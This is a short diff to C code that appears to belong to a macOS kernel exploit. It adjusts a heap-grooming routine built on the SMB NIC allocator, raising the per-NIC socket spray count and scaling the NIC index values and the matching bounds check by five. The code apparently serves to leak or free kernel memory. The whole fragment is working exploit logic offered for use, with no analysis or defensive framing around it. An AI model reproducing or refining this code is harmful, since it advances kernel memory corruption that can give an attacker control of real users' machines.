@@ -26,7 +26,7 @@
 
 
 #define NUM_SLOW_DOWN_NICS 150
-#define NUM_SOCKETS_PER_SLOW_DOWN_NIC 10000
+#define NUM_SOCKETS_PER_SLOW_DOWN_NIC 12500
 
 
 struct kmem_zkext_free_session {
@@ -56,7 +56,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
         
         for (int element_idx = 0; element_idx < num_elements_before_gap; element_idx++) {
             struct network_nic_info* info = &elements[element_idx];
-            info->nic_index = gap_idx * num_elements_before_gap + element_idx;
+            info->nic_index = (gap_idx * num_elements_before_gap + element_idx) * 5;
             info->addr_4.sin_len = sizeof(struct sockaddr_in);
             info->addr_4.sin_family = AF_INET;
             info->addr_4.sin_addr.s_addr = info->nic_index;
@@ -90,7 +90,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
     }
         
     struct complete_nic_info_entry* entry = (struct complete_nic_info_entry*)data;
-    if (entry->nic_index > num_gaps * num_elements_before_gap || entry->next.prev == 0) {
+    if (entry->nic_index > num_gaps * num_elements_before_gap * 5 || entry->next.prev == 0) {
         return EIO;
     }
     
